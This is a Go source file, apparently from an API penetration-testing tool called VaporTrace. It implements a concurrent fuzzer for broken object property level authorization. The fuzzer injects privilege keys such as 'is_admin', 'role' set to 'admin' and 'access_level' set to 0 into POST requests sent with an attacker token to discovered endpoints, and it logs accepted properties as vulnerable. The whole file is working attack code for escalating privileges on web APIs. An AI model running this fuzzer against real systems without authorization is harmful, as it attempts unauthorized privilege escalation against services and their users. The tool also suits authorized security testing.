package logic

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"sync"

	"github.com/JoseMariaMicoli/VaporTrace/pkg/db"
	"github.com/pterm/pterm"
)

// BOPLAContext defines the target and the base payload to fuzz
type BOPLAContext struct {
	TargetURL string
	Method    string // Usually POST, PATCH or PUT
	BaseJSON  string // The valid JSON body captured from the proxy or discovery
}

// Common administrative properties to inject for API3:2023 (Broken Object Property Level Authorization)
var administrativeKeys = []string{
	"is_admin", "isAdmin", "role", "privileges", "status", "verified",
	"permissions", "group_id", "internal_flags", "account_type",
	"is_staff", "can_delete", "access_level", "is_vip", "debug",
}

// ExecuteMassBOPLA automates property fuzzing across the discovery pipeline.
// It filters GlobalDiscovery.Inventory for endpoints tagged with "BOPLA".
func ExecuteMassBOPLA(concurrency int) {
	pterm.DefaultSection.Println("Phase 9.8: Industrialized BOPLA Engine")

	GlobalDiscovery.mu.RLock()
	var targets []string
	for path, entry := range GlobalDiscovery.Inventory {
		isTarget := false
		for _, eng := range entry.Engines {
			if eng == "BOPLA" {
				isTarget = true
				break
			}
		}
		if isTarget {
			targets = append(targets, path)
		}
	}
	GlobalDiscovery.mu.RUnlock()

	if len(targets) == 0 {
		pterm.Info.Println("No BOPLA-prone mutation endpoints detected.")
		return
	}

	for _, path := range targets {
		pterm.Info.Printfln("BOPLA Fuzzing Resource: %s", path)
		
		// Create context. We use POST as default for industrialized creation/update probing.
		ctx := &BOPLAContext{
			TargetURL: CurrentSession.TargetURL + path,
			Method:    "POST", 
			BaseJSON:  "{}", // Starting with an empty object for discovery
		}
		ctx.RunFuzzer(concurrency)
	}
}

// RunFuzzer orchestrates the property injection worker pool
func (b *BOPLAContext) RunFuzzer(concurrency int) {
	var wg sync.WaitGroup
	keyChan := make(chan string, len(administrativeKeys))

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for key := range keyChan {
				b.ProbeProperty(key)
			}
		}()
	}

	for _, key := range administrativeKeys {
		keyChan <- key
	}
	close(keyChan)
	wg.Wait()
}

// ProbeProperty attempts to inject a specific key and monitors for acceptance
func (b *BOPLAContext) ProbeProperty(key string) {
	// 1. Prepare Payload
	payloadMap := make(map[string]interface{})
	_ = json.Unmarshal([]byte(b.BaseJSON), &payloadMap)
	
	// Inject tactical values based on key name heuristics
	if key == "role" || key == "account_type" {
		payloadMap[key] = "admin"
	} else if key == "group_id" || key == "access_level" {
		payloadMap[key] = 0 // Often 0 or 1 signifies superuser in legacy systems
	} else {
		payloadMap[key] = true
	}

	payload, _ := json.Marshal(payloadMap)

	// 2. Build Request
	req, _ := http.NewRequest(b.Method, b.TargetURL, bytes.NewBuffer(payload))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "VaporTrace/2.1.0 (Phase 9.10 Industrialized)")
	
	activeToken := CurrentSession.AttackerToken
	if activeToken != "" {
		req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", activeToken))
	}

	// 3. Execute via SafeDo gatekeeper
	// isHit is false here because we only care about the response code analysis
	resp, err := SafeDo(req, false, "BOPLA-ENGINE")
	if err != nil {
		return
	}
	defer resp.Body.Close()

	// 4. Analysis: Success codes (200, 201, 204) indicate the property was likely accepted by the server logic
	if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusNoContent || resp.StatusCode == http.StatusCreated {
		pterm.Warning.Prefix = pterm.Prefix{Text: "HIT", Style: pterm.NewStyle(pterm.BgMagenta, pterm.FgBlack)}
		pterm.Warning.Printfln("BOPLA Potential: Property '%s' accepted at %s (Status: %d)", key, b.TargetURL, resp.StatusCode)

		db.LogQueue <- db.Finding{
			Phase:   "PHASE IV: INJECTION",
			Target:  b.TargetURL,
			Details: fmt.Sprintf("BOPLA Property Injection Success: '%s' accepted", key),
			Status:  "VULNERABLE",
		}
	}
}